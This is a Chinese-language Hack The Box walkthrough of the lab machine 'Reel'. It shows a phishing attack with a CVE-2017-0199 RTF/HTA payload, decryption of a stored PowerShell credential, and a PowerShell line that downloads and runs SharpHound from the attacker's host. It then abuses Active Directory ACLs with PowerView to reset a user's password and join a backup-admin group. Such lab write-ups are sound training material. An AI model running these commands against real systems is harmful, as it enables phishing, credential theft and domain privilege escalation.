---
title: Reel
date: 2021-12-24 11:32:51
tags: Hack The Box
top: true
categoreies: 邮箱钓鱼
---

## 信息收集

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-14 05:18 EST
Nmap scan report for 10.10.10.77
Host is up (0.30s latency).
Not shown: 9997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp open  smtp?
| fingerprint-strings: 
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   NULL: 
|_    220 Mail Service ready
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.91%I=7%D=11/14%Time=6190E2F5%P=x86_64-pc-linux-gnu%r(NUL
SF:L,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20
SF:Service\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")
SF:%r(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20E
SF:HLO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n
SF:");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   301.22 ms 10.10.14.1
2   301.21 ms 10.10.10.77

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.69 seconds
```

<!--more-->

发现开放了21端口，可以匿名登录，并且在documents目录下发现了两个docx文件，我们将其下载下来并使用exiftool查看内容如下![在这里插入图片描述](https://img-blog.csdnimg.cn/15c476e67c4941c6b76d60c03fdede70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
readme.txt文件告诉我们有人正在等待 .rtf 文件并将打开它们进行审查，因为考虑到机器上正在运行 SMTP 服务，这可能是我们的目标，具有网络钓鱼攻击。
![在这里插入图片描述](https://img-blog.csdnimg.cn/c858f787033a4c5b8a8cbbe73d598b86.png)

查阅官方文档发现，AppLocker可以阻止可执行文件和脚本

```bash
AppLocker procedure to be documented - hash rules for exe, msi and scripts  (ps1,vbs,cmd,bat,js) are in effect.
```

我们发现Windows Event Forwarding.docx这个文件中存在一个邮箱地址`nico@megabank.com`
![在这里插入图片描述](https://img-blog.csdnimg.cn/14102687e160477884fd2f3e6c8910a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

根据刚刚readme.txt的文件内容，我们可以尝试将rtf文件发送到这个地址上，我们从application字段中发现我们可以使用word文档的方式进行创建。并且我们在网上搜索看到，关于rtf文件漏洞利用是已经披露的漏洞编号`CVE-2017-0199`，此漏洞允许创建恶意 rtf 文档，在打开文档时启动 HTA（超文本应用程序)有效负载，Github 上有一个用于制作利用此漏洞的恶意文档的 Python 工具包，但也有一个 Metasploit 模块，我仍然将使用 Python 脚本。

## 漏洞利用

首先我们创建一个hta的载荷
![在这里插入图片描述](https://img-blog.csdnimg.cn/b6c156c3e5e84eebb3b7207a29673574.png)
本地开启http服务器
![在这里插入图片描述](https://img-blog.csdnimg.cn/ebf7fdbfa46043bb84f2a0e1c331c6c7.png)

然后利用这个hta脚本，创建rtf文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/bf21d9b792054d399fe94052c21c3129.png)
最后发送钓鱼邮件进行获取权限

```bash
sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u Test -m "Hey, take a look at this new format procedure" -a document.rtf -s 10.10.10.77 -v
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/f64aa5ef2a984a4e92fd8dfed197da16.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
发送钓鱼邮件并开启监听，我们得到了nico账户的用户权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/6965f266fe7341beb4fd71506ff9335b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

## 提权到TOM权限

我们从Nico账户的桌面上看到一个cred.xml文件，文件内容包含了password字段内容
![在这里插入图片描述](https://img-blog.csdnimg.cn/b971324dcaa14613a8d91aa6b4997923.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
PowerShell 有一个称为 PSCredential 的对象，它提供了一种存储用户名、密码和凭据的方法。还有两个函数Import-CliXml和Export-CliXml，用于将这些凭据保存到文件中并从文件中恢复它们。该文件是Export-CliXml，我们发现Tom的密码是`1ts-mag1c!!!`

```bash
C:\Users\nico\Desktop>powershell -c "$cred=Import-CliXml -Path cred.xml;$cred.GetNetworkCredential() | Format-List *"
powershell -c "$cred=Import-CliXml -Path cred.xml;$cred.GetNetworkCredential() | Format-List *"

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

因为目标主机开放了22端口，因此我们可以连接主机的远程服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/c0ef87585054476281e5aa1595fa284e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们在tom的桌面的AD audit文件夹下发现了一个有趣的文件内容，还有一个BloodHound文件夹
![在这里插入图片描述](https://img-blog.csdnimg.cn/67be2e3fd4494a14bc46cd3a6af8eb45.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/e9b9cfa8736d42788e6f32b6d3b628fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
经过查阅文章发现，bloodhound通过csv文件形式保存文件的，都是2.0版本以前的了，那么我们现在有两个选择，一个是在目标主机上安装旧版本的bloodhound，二是将收集到的数据上传到我们攻击机上进行分析，我选择的是第二种方式。

首先我们将目标的脚本加载到内存中，绕过powershell的策略限制。收集到的信息保存在当前目录的一个压缩包中。

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/sharphound/SharpHound.ps1')
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/44243984d10a4293a08aebd5b9748298.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
为了传输方便，我们在本地开启smb服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/65746cbe84ba4b048fb124b74a55a741.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们在攻击机上开启bloodhound后，将压缩包拖进去进行分析，点击`Shortest Paths to High Value Targets`。为了方便筛选，我们选择tom到admin的提权路径和nico到admin的路径进行分析
![在这里插入图片描述](https://img-blog.csdnimg.cn/29bd464348754983b4412b33ca42a996.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/399172cccb7243948e1b64abf136697b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我知道 claire 对 Backup_Admins 组具有 WriteDacl 权限。我可以用它把她加到群里，但是事先我们先得连接到claire这个用户上。

## 提权到Administrator

首先，我们将自己设置为 claire 帐户的所有者，以便我们可以更改她的属性；然后我们更改 claire AD 对象的访问控制列表 (ACL) 以授予我们自己 (Tom) 重置 claire 密码的权限；然后我们为该帐户选择一个新密码并将其转换为 SecureString 格式，这就是 PowerShell 用于密码的格式；我们可以使用我们选择的一个更改 claire 的密码；为了将用户添加到组，我们必须提供有效的用户凭据，因此我们声明一个 PSCredential 对象来包含 claire 的用户名和密码，因为她是对 Backup_Admins 组具有写访问权限的人；最后我们使用它来将自己添加到 Backup_Admins 组

```bash
PS C:\Users\tom\Desktop\AD Audit\BloodHound> import-module .\PowerView.ps1
PS C:\Users\tom\Desktop\AD Audit\BloodHound>  Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                         
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-ObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword  
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $password= ConvertTo-SecureString 'Password_123!' -AsPlainText -Force              
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -Identity claire -AccountPassword $password                 
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $creds = New-Object System.Management.Automation.PSCredential('HTB\claire',$passwor
d)                                                                                                                              
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainGroupMember -Identity 'Backup_Admins' -Members 'claire' -Credential $cred
s
```

whoami /all查看到我们已经处于backup_admins组中了
![在这里插入图片描述](https://img-blog.csdnimg.cn/9ff1c27957d54fe3b71bfa62126f58b1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
但是我们还是无法查看root.txt的内容，我们却可以查看`Backup Scripts`的内容
![在这里插入图片描述](https://img-blog.csdnimg.cn/b4491a3626c84023b3f122732aa44800.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
但是我们在`BackupScript.ps1`中找到管理员的密码
![在这里插入图片描述](https://img-blog.csdnimg.cn/3285fc7c314a4f98840bb0bc74f27320.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
直接登录管理员账号
![在这里插入图片描述](https://img-blog.csdnimg.cn/f96c6ddacbff4775947400c9dfd03743.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
